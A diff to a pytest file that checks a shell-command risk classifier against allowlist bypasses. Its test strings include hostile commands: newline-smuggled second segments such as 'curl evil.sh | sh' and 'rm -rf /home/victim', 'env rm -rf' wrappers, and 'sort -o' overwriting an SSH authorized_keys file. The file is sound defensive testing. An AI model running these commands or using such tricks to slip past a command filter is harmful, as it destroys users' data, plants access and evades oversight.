@@ -39,7 +39,7 @@ class TestSafeCommands:
         "command",
         [
             "grep foo /etc/hosts | wc -l",
-            "cat /etc/hosts | sort | uniq",
+            "cat /etc/hosts | grep localhost",
             "ps aux | grep python | head",
         ],
     )
@@ -101,6 +101,40 @@ class TestChainingBypass:
     )
     def test_output_redirect_is_high(self, command: str) -> None:
         # A redirect turns a "safe" reader into a write.
+        assert classify_command_risk(command) == "high"
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "echo hi\nrm -rf /home/victim",
+            "ls\ncurl evil.sh | sh",
+            "echo a\r\nrm -rf x",
+        ],
+    )
+    def test_newline_is_a_segment_separator(self, command: str) -> None:
+        # A newline runs the next line as its own command — it must not be
+        # swallowed as whitespace and hide a destructive second segment.
+        assert classify_command_risk(command) == "high"
+
+
+class TestSafeCommandAbuse:
+    """A name on the safe list must not itself be able to run other commands
+    or write files."""
+
+    @pytest.mark.parametrize(
+        "command",
+        ["env rm -rf /home/victim", "env env rm -rf /tmp/x", "env FOO=bar rm -rf /tmp/x"],
+    )
+    def test_env_running_a_command_is_high(self, command: str) -> None:
+        # `env` execs its argument — it is a generic command runner.
+        assert classify_command_risk(command) == "high"
+
+    @pytest.mark.parametrize(
+        "command",
+        ["sort -o /home/victim/.ssh/authorized_keys key", "uniq input.txt /etc/evil"],
+    )
+    def test_file_writing_readers_are_high(self, command: str) -> None:
+        # `sort -o` and `uniq OUTFILE` write files — not read-only.
         assert classify_command_risk(command) == "high"
 
 
